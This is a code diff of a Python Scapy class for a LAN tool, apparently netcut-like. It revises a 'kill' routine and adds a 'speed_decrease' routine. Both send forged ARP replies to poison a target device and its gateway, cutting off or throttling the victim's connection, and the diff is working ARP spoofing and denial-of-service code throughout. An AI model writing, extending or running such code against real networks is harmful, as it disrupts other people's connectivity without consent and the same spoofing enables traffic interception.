@@ -10,7 +10,9 @@ from multiprocessing import Manager
 class ScapyOperations:
 
     def __init__(self):
-        self.dead = multiprocessing.Manager().dict()
+        manager = Manager()
+        self.dead = manager.dict()
+        self.speed_of_ips = manager.dict()
 
     def arp_scan(self, ip):
         """
@@ -47,7 +49,7 @@ class ScapyOperations:
 
         return result2
 
-    def kill(self, source, target_mac, target_ip, wait_after=1):
+    def kill(self, source, target_mac, target_ip, wait_after):
         """
         Spoofing target
         """
@@ -67,16 +69,18 @@ class ScapyOperations:
             pdst=source[0]
         )
 
-        if target_ip not in self.dead:
-            self.dead[target_ip] = target_mac
-            print(self.dead)
-            while target_ip in self.dead:
-                # Send packets to both target and source
-                send(to_target, verbose=0)
-                send(to_source, verbose=0)
-                time.sleep(wait_after)
-        print("unkilled1")
-    
+        temp_speed = self.speed_of_ips[target_ip]
+        while True:
+            if target_ip in self.speed_of_ips:
+                if self.speed_of_ips[target_ip] == temp_speed:
+                    # Send packets to both target and source
+                    send(to_target, verbose=0)
+                    send(to_source, verbose=0)
+                    time.sleep(wait_after)
+                else:
+                    break
+            else:
+                break
 
     def unkill(self, source, target_mac, target_ip):
         """
@@ -108,3 +112,66 @@ class ScapyOperations:
         send(to_target, verbose=0)
         send(to_router, verbose=0)
         print("unkilled2")
+
+    def speed_decrease(self, source, target_mac, target_ip, wait_after):
+        temp_speed = self.speed_of_ips[target_ip]
+        """
+        Spoofing target
+        """
+        # Cheat target
+        to_target_kill = ARP(
+            op=2,
+            psrc=source[0],
+            hwdst=target_mac,
+            pdst=target_ip
+        )
+
+        # Cheat source
+        to_source_kill = ARP(
+            op=2,
+            psrc=target_ip,
+            hwdst=source[1],
+            pdst=source[0]
+        )
+
+        """
+        Unspoofing target
+        """
+        # Fix target
+        to_target_unkill = ARP(
+            op=1,
+            psrc=source[0],
+            hwsrc=source[1],
+            pdst=target_ip,
+            hwdst=target_mac
+        )
+
+        # Fix Router
+        to_router_unkill = ARP(
+            op=1,
+            psrc=target_ip,
+            hwsrc=target_mac,
+            pdst=source[0],
+            hwdst=source[1]
+        )
+        while True:
+            if target_ip in self.speed_of_ips:
+                if self.speed_of_ips[target_ip] == temp_speed:
+                    # Send packets to both target and source
+                    if self.speed_of_ips[target_ip] == 3:
+                        for i in range(wait_after):
+                            send(to_target_kill, verbose=0)
+                            send(to_source_kill, verbose=0)
+                            time.sleep(wait_after)
+                    else:
+                        send(to_target_kill, verbose=0)
+                        send(to_source_kill, verbose=0)
+                        time.sleep(wait_after)
+
+                    send(to_target_unkill, verbose=0)
+                    send(to_router_unkill, verbose=0)
+                    time.sleep(1.5)
+                else:
+                    break
+            else:
+                break
